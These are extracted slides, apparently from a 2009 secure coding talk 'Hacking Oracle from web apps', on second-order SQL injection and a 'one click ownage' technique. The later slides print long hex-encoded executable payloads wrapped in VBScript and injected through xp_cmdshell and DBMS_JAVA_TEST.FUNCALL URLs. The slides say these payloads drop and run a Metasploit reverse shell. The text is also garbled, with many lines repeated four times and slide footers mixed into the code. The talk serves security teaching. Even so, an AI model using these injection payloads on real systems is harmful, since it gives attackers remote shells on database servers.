old_pass
old_pass
old_pass & 
& 
& 
& “’” 
“’” 
“’” 
“’” 
Set
Set
Set
Set rec
rec
rec
rec = 
= 
= 
= conn.Execute
conn.Execute
conn.Execute
conn.Execute(query1)
(query1)
(query1)
(query1)
Second Order SQL Injection
Sanitises 
user’s 
input
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
61
Set
Set
Set
Set rec
rec
rec
rec = 
= 
= 
= conn.Execute
conn.Execute
conn.Execute
conn.Execute(query1)
(query1)
(query1)
(query1)
If
If
If
If (rec.EOF) Then
(rec.EOF) Then
(rec.EOF) Then
(rec.EOF) Then
Response.Write
Response.Write
Response.Write
Response.Write "Invalid Password"
"Invalid Password"
"Invalid Password"
"Invalid Password"
Else
Else
Else
Else
query2 = 
query2 = 
query2 = 
query2 = “update from 
“update from 
“update from 
“update from tbl_user
tbl_user
tbl_user
tbl_user set password=’”
set password=’”
set password=’”
set password=’” & 
& 
& 
& new_pass
new_pass
new_pass
new_pass
& 
& 
& 
& “’ where 
“’ where 
“’ where 
“’ where login_id
login_id
login_id
login_id=’”
=’”
=’”
=’” & 
& 
& 
& rec.(“
rec.(“
rec.(“
rec.(“login_id
login_id
login_id
login_id”)
”)
”)
”) & 
& 
& 
& “’”
“’”
“’”
“’”
conn.Execute
conn.Execute
conn.Execute
conn.Execute(query2)
(query2)
(query2)
(query2)
..
..
..
..
..
..
..
..
End If
End If
End If
End If
Value coming from session, what if login_id is 
foo’ or ‘1’=‘1
Dan Haagman, InfoSecurity 2009
Second order SQL Injection [1]
First name:
Second name:
http://webshop.com
WebShop New User’s registration form
Johnn
Smartie
The record is stored in a database and a new user’s 
account is waiting for  activation…
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
62
Attacker
Second name:
Phone nr.:
Address:
Special 
delivery 
instructions:
Foo’||evilfunc()||’)--
Smartie
012 345 678
Central Str. 66, Cambridge
Execute immediate ‘Insert into 
spc_delivery_option values(1,:a)’ using var1;
Dan Haagman, InfoSecurity 2009
Second order SQL Injection [2]
Administrator
The new user’s 
account is activated
The new user’s data record is stored 
into the table with active users.
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
63
Administrator
Dan Haagman, InfoSecurity 2009
Second order SQL Injection [2]
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
64
Final query: 
Insert into special_delivery values 
(4,‘’||scott.evilfunc()||’)--’)
Dan Haagman, InfoSecurity 2009
 SQL Injection does not occur within the attacker’s session
 E.g. attacker places an order via a ecommerce application
 Admin logs in and approves the order
Non interactive second order SQL Injection
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
65
 Admin logs in and approves the order
 Admin’s session is vulnerable to SQL Injection
 Attacker’s input gets passed to the vulnerable SQL call.
Dan Haagman, InfoSecurity 2009
CREATE OR REPLACE TRIGGER "SYSTEM"."MYTRIGGER" BEFORE INSERT 
ON SCOTT.ORDER_TABLE
REFERENCING NEW AS NEWROW
FOR EACH ROW
DECLARE
L NUMBER;
S VARCHAR2(5000);
BEGIN
L:=LENGTH(:NEWROW.V);
Second order SQL Injection
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
66
L:=LENGTH(:NEWROW.V);
IF L > 15 THEN
DBMS_OUTPUT.PUT_LINE('INSERTING INTO MYTABLE_LONG AS 
WELL');
S:='INSERT INTO MYTABLE_LONG (V) VALUES (''' || 
:NEWROW.V || ''')';
EXECUTE IMMEDIATE S;
END IF;
END MYTRIGGER;
ALTER TRIGGER "SYSTEM"."MYTRIGGER" ENABLE
Dan Haagman, InfoSecurity 2009
 Exploit non Interactive SQL Injections
 Concept by Ferruh Mavituna
– Generate a hex representation of the "shell.exe" in the local 
system, 
– Write a VBScript that can process this hex string and 
One Click Ownage
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
67
– Write a VBScript that can process this hex string and 
generate a valid binary file, 
– Put all this together into one line, 
– Carry out the SQL injection with this one line.
– Enjoy the reverse shell ☺
Dan Haagman, InfoSecurity 2009
One Click Ownage: How To
Metasploit’s
msfpayload
shell.exe
1. Shell.exe is generated by Metasploit. The payload executed on target 
server starts reverse shell connection to the attacker’s machine.
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
68
shell.exe
Compressed and HEX-
encoded with decryptor
stub attached
payload.vba
2. Shell.exe is compessed and hex-encoded. It is then converted to the 
one line (quite long…) of VB code, which being executed on the target 
machine re-create and run shell.exe.
Dan Haagman, InfoSecurity 2009
One Click Ownage: How To
Compressed and HEX-
encoded with decryptor
stub attached
payload.vba
http://vulnerable...
Web browser user for 
exploitation of SQL injection.
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
69
3. SQL Injection is exploited: 
• VB script is deployed on the target server (using xp_cmdshell executed with given 
parameters )
• VB script is executed on the target server, so the file shell.exe is recreated
• The file shell.exe is executed so the remote connection to the attacker’s machine 
is initiated from the target server. Because of that, it is not detected by firewall.
• Attacker got a remote shell to the target server.
exploitation of SQL injection.
Dan Haagman, InfoSecurity 2009
http://example.com?sqlinjection.aso?id=1;exec master..xp_cmdshell 'echo 
d="4D5A900003x0304x03FFFFx02B8x0740x2380x030E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265207
2756E20696E244F53206D6F64652E0D0D0A24x075045x024C010300176FAD27x08E0000F030B0102380010x0310x0350x024062x0360x0370x0440
x0210x0302x0204x0301004x0880x0310x0602x0520x0210x0410x0210x0610x0C70x02ACx7355505830x0550x0310x0702x0E80x02E055505831x051
0x0360x0304x0302x0E40x02E5505832x0510x0370x0302x0306x0E40x02C0332E303300555058210D090209F0B5FC11B9DF8C86A641x021D02x032
6x0226x02EDB7FFDBFF31C0B90020400683100464FF30648920506A406812x02DA2FE4F65151E9x023C90FF253C402916B205DB07x020F40882A4B
E6000700FFFFEE01FCE8560B535556578B6C2418B4538B54057801FFFFFFE5EA8B4A5A2001EBE332498B348B01EE31FFFC31C0AC38E07407C1CFDB
97EDFF0D01C7EBF23B7C241475E12324668B0C4B081CFFDFE2E8B429E8EB02285F5E5D5BC208005E6A305964FB7F7BFB8B198B5B0C021C8B1B04
0853688E4E0EECFFD689C709F3DFBE7C54CAAF9181EC00018A505756539E5E81FFFFFF5D900EB61918E7A41970E9ECF9AA60D909F5ADCBEDFC3B
5753325F33FFFFFFFF32005B8D4B1851FFD789DF89C38D75146A05595153FF348FFF504598948EE273DDB6FDF22B2754FF370D2883500040010C6
FFFFF6D246D68C0A801976802001A0A89E16A10515714206A40B5B6BDFB5E56C1E6060308566A0100C500A8B2E0AE851A18FFD3B81141B62A1F8
3AA0009C23617C974404858400F84CE54B60340615516A0A80C7FD90C14443C30014578697450E2DDBFFC72F63657373669727475616C0F74656
3740FF92FCF1050454C010300176FAD27E000788334FF0F030B0102380002221003EDBAB724F204B1F04060100DF7B369B07501775F9060020583
0D96037103F103D85A9485E84002E02857DC39E786090AC02236FD9FBBBB9602E72646174610C03EC9B9D3D64402E692784104B4188293B2427C
1 click 0wnage SQL server
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
70
0D96037103F103D85A9485E84002E02857DC39E786090AC02236FD9FBBBB9602E72646174610C03EC9B9D3D64402E692784104B4188293B2427C
029x03B82A070012x02FFx0E60BE156040008DBEEBAFFFFF57EB0B908A064688074701DB75078B1E83EEFC11DB72EDB801x31DB75078B1E83EEFC
11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB508B1E83
EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A
022887474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B901x038A07472CE83C0177F7803F0075F28B078A5F
0466C1E80C1C0086C429F880EBE801F0890783C70588D8E2D98DBE0040x028B0709C0743C8B5F048D84300060x0201F35083C708FF962860x0295
8A074708C074DC89F9748F2E55FF962C60x0209C07407890383C304EBE1FF963C60x028BAE3060x028DBE00F0FFFFBB0010x0250546A045357FFD5
8D879F01x0280207F8060287F5505450357FFD558618D4424806A0039C475FA83EC80E938ACFFFFx444470x022870x165070x025E70x026E70x027
E70x028C70x029A70x064B45524E454C3322E444CCx024C6F61644C69627261727941x0247657450726F6341646472657373x025669727475616C5
0726F74656374x025669727475616C416C6C6F63x0566972745616C46726565x034578697450726F63657373xFFx5A":W 
CreateObject^("Scripting.FileSystemObject"^).GetSpecialFolder^(2^) ^& "\wr.exe", R^(d^):Function R^(t^):Dim Arr^(^):For i=0 To Len^(t^)-1 Step 
2:Redim Preserve Ar^(S^):FB=Mid^(t,i+1,1^):SB=Mid^(t,i+2,1^):HX=FB ^& SB:If FB="x" Then:NB=Mid^(t,i+3,1^):L=H^(SB ^& NB^):For j=0 To L:Redim 
Preserve Ar^(S+^(j*2^)+1^):Ar^(S+j^)=0:Ar^(S+j+1^)=0:Next:i=i+1:S=S+L:Else:If Len^(HX^)^>0 Then:Ar^(S^)=H^(HX^):End If:S=S+1:End If:Next:Redim
Preserve Ar^(S-2^):R=Ar:End Function:Function H^(HX^):H=CLng^("&H" ^& HX^):End Function:Sub W^(FN, Buf^):Dim aBuf:Size = 
UBound^(Buf^):ReDim aBuf^(Size\2^):For I = 0 To Size - 1 Step 2:aBuf^(I\2^)=ChrW^(Buf^(I+1^)*256+Buf^(I^)^):Next:If I=Size 
Then:aBuf^(I\2^)=ChrW^(Buf^(I^)^):End If:aBuf=Join^(aBuf,""^):Set bS=CreateObject^("ADODB.Stream"^):bS.Type=1:bS.Open:With 
CreateObject^("ADODB.Stream"^):.Type=2:.Open:.WriteText aBuf:.Position=2:.CopyTo bS:.Close:End With:bS.SaveToFile FN,2:bS.Close:Set 
bS=Nothing:End Sub>p.vbs && p.vbs && %TEMP%\wr.exe‘ 
Dan Haagman, InfoSecurity 2009
http://192.168.2.10/ora1.php
?name=1 and (Select 
DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','echo
d="4D5A900003x0304x03FFFFx02B8x0740x2380x030E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E
6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24x075045x024C0103006716F0D6x08E0000F030B0102380010
x0310x0350x024062x0360x0370x0440x0210x0302x0204x0301x0304x0880x0310x0602x0520x0210x0410x0210x0610x0C70x02A
Cx7355505830x0550x0310x0702x0E80x02E055505831x0510x0360x0304x0302x0E40x02E055505832x0510x0370x0302x0306x0E
40x02C0332E303500555058210D09020993B63B0E5CE0BCADA641x021D02x0326x0226x02C3B7FFDBFF31C0B900204000683010
0464FF30648920506A406812x02DA2FE4F65151E9x023C90FF253C402916B205DB07x020F40882A4BE6000700FFFFEE01FCE8560
…C70588D8E2D98DBE0040x028B0709C0743C8B5F048D84300060x0201F35083C708FF962860x02958A074708C074DC89F95748
F2AE55FF962C60x0209C07407890383C304EBE1FF963C60x028BAE3060x028DBE00F0FFFFBB0010x0250546A045357FFD58D879F
1 click ownage (Oracle with Java IO privs)